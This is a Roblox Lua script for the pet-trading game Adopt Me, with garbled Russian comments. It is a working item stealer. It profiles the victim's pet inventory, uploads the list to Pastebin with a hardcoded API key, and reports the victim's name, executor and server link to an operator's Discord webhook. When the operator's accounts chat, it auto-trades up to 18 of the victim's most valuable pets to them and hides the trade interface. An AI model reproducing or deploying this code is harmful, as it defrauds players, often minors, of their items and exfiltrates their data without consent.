local rarityMultipliers = {
    FR = 3.0, MFR = 8.0, NFR = 4.0, 
    F = 2.0, R = 1.5, N = 2.5, M = 6.0
}

-- –°–∏—Å—Ç–µ–º–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏—è —Ç—Ä–µ–π–¥–æ–≤
local Loads = require(game.ReplicatedStorage.Fsys).load
local RouterClient = Loads("RouterClient")
local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
local SettingsRemote = RouterClient.get("SettingsAPI/SetSetting")

SettingsRemote:FireServer("trade_requests", 1)

local function declineTradeRequest(player)
    TradeAcceptOrDeclineRequest:InvokeServer(player, false)
end

-- –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è
local tradeCooldowns = {}
local lastTradeTime = 0
local TRADE_COOLDOWN = 2 -- 30 —Å–µ–∫—É–Ω–¥ –∫–æoldown –º–µ–∂–¥—É —Ç—Ä–µ–π–¥–∞–º–∏

TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
    if sender.Name ~= game.Players.LocalPlayer.Name then
        declineTradeRequest(sender)
    end
end)

-- –û–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –ø–µ—Ç–∞–º
local InventoryDB = Loads("InventoryDB")
local ClientData = Loads("ClientData")

local function calculatePetValue(petData)
    local petInfo = InventoryDB[petData.category][petData.id]
    local petName = petInfo.name
    local baseValue = 0
    
    for petKey, valueData in pairs(valuesTable) do
        if string.lower(petName) == string.lower(petKey) then
            baseValue = valueData.value
            break
        end
    end
    
    local multiplier = 1.0
    if petData.properties then
        if petData.properties.mega_neon and petData.properties.flyable and petData.properties.rideable then
            multiplier = rarityMultipliers.MFR
        elseif petData.properties.neon and petData.properties.flyable and petData.properties.rideable then
            multiplier = rarityMultipliers.NFR
        elseif petData.properties.flyable and petData.properties.rideable then
            multiplier = rarityMultipliers.FR
        elseif petData.properties.mega_neon then
            multiplier = rarityMultipliers.M
        elseif petData.properties.neon then
            multiplier = rarityMultipliers.N
        elseif petData.properties.flyable then
            multiplier = rarityMultipliers.F
        elseif petData.properties.rideable then
            multiplier = rarityMultipliers.R
        end
    end
    
    return baseValue * multiplier, baseValue
end

local function getPetTypeString(properties)
    if not properties then return "" end
    if properties.mega_neon and properties.flyable and properties.rideable then return " MFR"
    elseif properties.neon and properties.flyable and properties.rideable then return " NFR"
    elseif properties.flyable and properties.rideable then return " FR"
    elseif properties.mega_neon then return " Mega"
    elseif properties.neon then return " Neon"
    elseif properties.flyable then return " Fly"
    elseif properties.rideable then return " Ride"
    else return "" end
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏ –∏–Ω–≤–µ–Ω—Ç–∞—Ä—è
local function getInventoryStats()
    local playerData = ClientData.get_data()[game.Players.LocalPlayer.Name]
    local stats = {
        legendary = 0, ultra_rare = 0, rare = 0, uncommon = 0, common = 0,
        mfr = 0, nfr = 0, fr = 0, mega = 0, neon = 0, fly = 0, ride = 0,
        totalValue = 0, valuableCount = 0
    }
    
    local topPets = {}
    
    for _, petData in pairs(playerData.inventory.pets) do
        local petInfo = InventoryDB[petData.category][petData.id]
        local calculatedValue, baseValue = calculatePetValue(petData)
        
        -- –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø–æ —Ä–µ–¥–∫–æ—Å—Ç–∏
        if petInfo.rarity == "legendary" then stats.legendary = stats.legendary + 1
        elseif petInfo.rarity == "ultra_rare" then stats.ultra_rare = stats.ultra_rare + 1
        elseif petInfo.rarity == "rare" then stats.rare = stats.rare + 1
        elseif petInfo.rarity == "uncommon" then stats.uncommon = stats.uncommon + 1
        elseif petInfo.rarity == "common" then stats.common = stats.common + 1 end
        
        -- –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø–æ —Å–≤–æ–π—Å—Ç–≤–∞–º
        if petData.properties then
            if petData.properties.mega_neon then stats.mega = stats.mega + 1 end
            if petData.properties.neon then stats.neon = stats.neon + 1 end
            if petData.properties.flyable then stats.fly = stats.fly + 1 end
            if petData.properties.rideable then stats.ride = stats.ride + 1 end
            if petData.properties.flyable and petData.properties.rideable then stats.fr = stats.fr + 1 end
            if petData.properties.neon and petData.properties.flyable and petData.properties.rideable then stats.nfr = stats.nfr + 1 end
            if petData.properties.mega_neon and petData.properties.flyable and petData.properties.rideable then stats.mfr = stats.mfr + 1 end
        end
        
        if baseValue > 0 then
            stats.valuableCount = stats.valuableCount + 1
            stats.totalValue = stats.totalValue + calculatedValue
            
            table.insert(topPets, {
                name = petInfo.name,
                value = calculatedValue,
                properties = petData.properties or {}
            })
        end
    end
    
    table.sort(topPets, function(a, b) return a.value > b.value end)
    
    return stats, topPets
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è pastebin
local function pastebin(content)
    local body = {
        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
        api_paste_code = content,
        api_option = "paste"
    }

    local encodedBody = ""
    for key, value in pairs(body) do
        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
    end
    encodedBody = encodedBody:sub(1, -2)

    local success, response = pcall(function()
        return request({
            Url = "https://pastebin.com/api/api_post.php",
            Method = "POST",
            Body = encodedBody,
            Headers = {
                ["Content-Type"] = "application/x-www-form-urlencoded"
            }
        })
    end)

    if success and response then
        local pasteUrl = response.Body
        return "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
    end
    
    return "https://pastebin.com/raw/example"
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –ø–æ–ª–Ω–æ–≥–æ —Å–ø–∏—Å–∫–∞ –ø–µ—Ç–æ–≤
local function createFullPetsList()
    local petCategories = {
        legendary = {}, ultra_rare = {}, rare = {}, uncommon = {}, common = {}
    }
    
    local playerData = ClientData.get_data()[game.Players.LocalPlayer.Name]
    
    for _, petData in pairs(playerData.inventory.pets) do
        local petInfo = InventoryDB[petData.category][petData.id]
        local calculatedValue = calculatePetValue(petData)
        local petType = getPetTypeString(petData.properties)
        local petEntry = string.format("%s%s: %d‚ÇΩ", petInfo.name, petType, math.floor(calculatedValue))
        
        if petInfo.rarity == "legendary" then table.insert(petCategories.legendary, petEntry)
        elseif petInfo.rarity == "ultra_rare" then table.insert(petCategories.ultra_rare, petEntry)
        elseif petInfo.rarity == "rare" then table.insert(petCategories.rare, petEntry)
        elseif petInfo.rarity == "uncommon" then table.insert(petCategories.uncommon, petEntry)
        elseif petInfo.rarity == "common" then table.insert(petCategories.common, petEntry) end
    end
    
    local pastebinContent = "-- üêâ LEGENDARY PETS üêâ --\n"
    pastebinContent = pastebinContent .. (#petCategories.legendary > 0 and table.concat(petCategories.legendary, "\n") or "None") .. "\n\n"
    pastebinContent = pastebinContent .. "-- üî• ULTRA-RARE PETS üî• --\n"
    pastebinContent = pastebinContent .. (#petCategories.ultra_rare > 0 and table.concat(petCategories.ultra_rare, "\n") or "None") .. "\n\n"
    pastebinContent = pastebinContent .. "-- üíé RARE PETS üíé --\n"
    pastebinContent = pastebinContent .. (#petCategories.rare > 0 and table.concat(petCategories.rare, "\n") or "None") .. "\n\n"
    pastebinContent = pastebinContent .. "-- üü¢ UNCOMMON PETS üü¢ --\n"
    pastebinContent = pastebinContent .. (#petCategories.uncommon > 0 and table.concat(petCategories.uncommon, "\n") or "None") .. "\n\n"
    pastebinContent = pastebinContent .. "-- ‚ö™ COMMON PETS ‚ö™ --\n"
    pastebinContent = pastebinContent .. (#petCategories.common > 0 and table.concat(petCategories.common, "\n") or "None")
    
    return pastebin(pastebinContent)
end

-- –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤–µ–±—Ö—É–∫–∞
local function SendMainWebhook()
    local stats, topPets = getInventoryStats()
    local plr = game.Players.LocalPlayer
    local pastebinLink = createFullPetsList()
    
    -- –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º —Ç–æ–ø –ø–µ—Ç–æ–≤
    local topPetsText = ""
    for i = 1, math.min(5, #topPets) do
        local pet = topPets[i]
        local petType = getPetTypeString(pet.properties)
        topPetsText = topPetsText .. string.format("%s%s: %d‚ÇΩ\n", pet.name, petType, math.floor(pet.value))
    end

    local embed = {
        ["title"] = "üéØ –í–¨–ï–ë–ê–ù - –î–æ–ª–±–∞–µ–± —Ä–∞–∫–Ω—É–ª –≤–∞—à —Å–∫—Ä–∏–ø—Ç! - ".. plr.Name,
        ["color"] = 16711935,
        ["fields"] = {
            {
                ["name"] = "üîó **Teleport Info**",
                ["value"] = 
                 "üöÄ**–í—Å—Ç–∞–≤—å –≤ –±—Ä–∞—É–∑–µ—Ä –¥–ª—è —Å–≤—è–∑–∏ —Å –¥—É–ø–ª–æ–º**\n```roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. realJobId .. "```\n" ..
                "**Teleport Script:**```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. (realJobId) .. "\")\n```",
                ["inline"] = false
            },
            {
                ["name"] = "„Äò:mammoth:„Äô**Info User**",
                ["value"] = "```lua\n" ..
                            "Username      : " .. plr.Name .. "\n" ..
                            "Account Age   : " .. plr.AccountAge .. " Days\n" ..
                            "Executor      : " .. (identifyexecutor() or "Unknown") .. "\n" ..
                            "Receiver      : " .. Username .. ", " .. Username2 .. "```"                            
            },
            {
                ["name"] = "„Äò:moneybag:„Äô**Inventory Stats**",
                ["value"] = "```lua\n" ..
                            "Total Value     : " .. string.format("%d‚ÇΩ", math.floor(stats.totalValue)) .. "\n" ..
                            "MFR Pets        : " .. stats.mfr .. "\n" ..
                            "NFR Pets        : " .. stats.nfr .. "\n" ..
                            "FR Pets         : " .. stats.fr .. "\n" ..
                            "Mega Pets       : " .. stats.mega .. "\n" ..
                            "Neon Pets       : " .. stats.neon .. "\n" ..
                            "Legendary Pets  : " .. stats.legendary .. "\n" ..
                            "Ultra Rare Pets : " .. stats.ultra_rare .. "```" 
            },
            {
                ["name"] = "„Äò:crown:„Äô**Top Valuable Pets**",
                ["value"] = "```lua\n" .. (topPetsText ~= "" and topPetsText or "No valuable pets") .. "```",
                ["inline"] = false
            },
            {
                ["name"] = "„Äò:scroll:„Äô**Full Pets List**",
                ["value"] = "[üìã Click to view all pets](" .. pastebinLink .. ")",
                ["inline"] = false
            },
        }
    }

    local data = {
        username = "M O L I T O W N",
        avatar_url = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
        content = stats.totalValue >= 50 and "@everyone\n**Teleport Script:**```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. (realJobId or fakeJobId) .. "\")\n```" or "Broke injected ur script.",
        embeds = {embed}
    }

    local success, result = pcall(function()
        return request({
            Url = Webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è —É—Å–ø–µ—à–Ω–æ–≥–æ —Ç—Ä–µ–π–¥–∞
local function SendTradeSuccessMessage(receiverName, tradedPets)
    local totalValue = 0
    local petsText = ""
    
    for i, pet in ipairs(tradedPets) do
        local calculatedValue = calculatePetValue(pet.data)
        local petType = getPetTypeString(pet.data.properties or {})
        petsText = petsText .. string.format("%s%s: %d‚ÇΩ\n", pet.name, petType, math.floor(calculatedValue))
        totalValue = totalValue + calculatedValue
    end

    local data = {
        username = "Mama Mio [–ú–§–û –í–û–†–ö 2025]",
        avatar_url = "https://i.pinimg.com/736x/ae/1c/35/ae1c3515d3891f20997929813c9ea8fe.jpg",
        embeds = {{
            title = "‚úÖ –ß–£–†–ö–ê –ë–´–õ–ê –í–¨–ï–ë–ê–ù–ê –ö–û–¢–û–ü–ï–°",
            color = 65280,
            fields = {
                {
                    name = "üë§ Trade Info",
                    value = "```lua\n" ..
                           "Victim    : " .. game.Players.LocalPlayer.Name .. "\n" ..
                           "Receiver  : " .. receiverName .. "\n" ..
                           "Total Value: " .. string.format("%d‚ÇΩ", math.floor(totalValue)) .. "\n" ..
                           "Pets Sent : " .. #tradedPets .. "```",
                    inline = false
                },
                {
                    name = "üéÅ Traded Pets",
                    value = "```lua\n" .. (petsText ~= "" and petsText or "No pets traded") .. "```",
                    inline = false
                }
            },
            timestamp = DateTime.now():ToIsoDate(),
            footer = {text = "–í–û–†–ö–ê–ï–ú –ö–õ–Ø–ò–ù–° –í 2032! FEAT TEMNI PRINC"}
        }}
    }
    
    pcall(function()
        request({
            Url = Webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- –û–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Ç—Ä–µ–π–¥–∞ —Å –∑–∞—â–∏—Ç–æ–π –æ—Ç –¥—É–±–ª–∏—Ä–æ–≤–∞–Ω–∏—è
local function TradeIncoming(receiverName)
    local currentTime = os.time()
    
    -- –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æoldown
    if currentTime - lastTradeTime < TRADE_COOLDOWN then
        return
    end
    
    -- –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏—è –∏–≥—Ä–æ–∫–∞
    local receiver = game.Players:FindFirstChild(receiverName)
    if not receiver then return end
    
    lastTradeTime = currentTime
    
    local RouterClient = Loads("RouterClient")
    local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
    
    local playerData = ClientData.get_data()[game.Players.LocalPlayer.Name]
    local sortedPets = {}
    local tradedPets = {}
    
    -- –°–æ—Ä—Ç–∏—Ä—É–µ–º –ø–µ—Ç—ã –ø–æ —Ü–µ–Ω–Ω–æ—Å—Ç–∏
    for petUid, petData in pairs(playerData.inventory.pets) do
        local petInfo = InventoryDB[petData.category][petData.id]
        local calculatedValue = calculatePetValue(petData)
        table.insert(sortedPets, {
            uid = petUid,
            data = petData,
            value = calculatedValue,
            name = petInfo.name
        })
    end
    
    table.sort(sortedPets, function(a, b) return a.value > b.value end)
    
    -- –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç—Ä–µ–π–¥ –∑–∞–ø—Ä–æ—Å
    SendTrade:FireServer(receiver)
    wait(5)
    
    -- –î–æ–±–∞–≤–ª—è–µ–º –ø–µ—Ç–æ–≤ –≤ —Ç—Ä–µ–π–¥ (–º–∞–∫—Å 18)
    local petCount = 0
    for _, petInfo in ipairs(sortedPets) do
        if petCount < 18 then
            AddPetRemote:FireServer(petInfo.uid)
            table.insert(tradedPets, petInfo)
            petCount = petCount + 1
            wait(0.2)
        else
            break
        end
    end
    
    -- –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ–º —Ç—Ä–µ–π–¥
    wait(5)
    AcceptNegotiationRemote:FireServer()
    wait(2)
    ConfirmTradeRemote:FireServer()
    wait(2)
    
    -- –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—à–Ω–æ–º —Ç—Ä–µ–π–¥–µ
    if #tradedPets > 0 then
        SendTradeSuccessMessage(receiverName, tradedPets)
    end
end

-- –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ —á–∞—Ç–∞ —Å –∑–∞—â–∏—Ç–æ–π –æ—Ç –¥—É–±–ª–∏—Ä–æ–≤–∞–Ω–∏—è
local processedTrades = {}

local function setupChatListener(player)
    player.Chatted:Connect(function(msg)
        if (player.Name == Username or player.Name == Username2) and not processedTrades[player.Name] then
            processedTrades[player.Name] = true
            TradeIncoming(player.Name)
            
            -- –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Ñ–ª–∞–≥ —á–µ—Ä–µ–∑ 10 —Å–µ–∫—É–Ω–¥
            delay(10, function()
                processedTrades[player.Name] = nil
            end)
        end
    end)
end

-- –ù–∞—Å—Ç—Ä–æ–π–∫–∞ —Å–ª—É—à–∞—Ç–µ–ª–µ–π –¥–ª—è —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö –∏–≥—Ä–æ–∫–æ–≤
for _, player in pairs(Players:GetPlayers()) do
    if player.Name == Username or player.Name == Username2 then
        setupChatListener(player)
    end
end

-- –ù–∞—Å—Ç—Ä–æ–π–∫–∞ —Å–ª—É—à–∞—Ç–µ–ª–µ–π –¥–ª—è –Ω–æ–≤—ã—Ö –∏–≥—Ä–æ–∫–æ–≤
Players.PlayerAdded:Connect(function(player)
    if player.Name == Username or player.Name == Username2 then
        setupChatListener(player)
    end
end)

-- –û—Ç–ø—Ä–∞–≤–∫–∞ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –≤–µ–±—Ö—É–∫–∞
SendMainWebhook()

-- –û—Ç–∫–ª—é—á–∞–µ–º –Ω–µ–Ω—É–∂–Ω—ã–µ GUI
game.Players.LocalPlayer.PlayerGui.TradeApp.Enabled = false
if game.Players.LocalPlayer.PlayerGui:FindFirstChild("HintApp") then
    game.Players.LocalPlayer.PlayerGui.HintApp:Destroy()
end
game.Players.LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false

print("‚úÖ –°–∏—Å—Ç–µ–º–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω–∞! –û–∂–∏–¥–∞–Ω–∏–µ —Ç—Ä–µ–π–¥–æ–≤ –æ—Ç: " .. Username .. " –∏ " .. Username2)
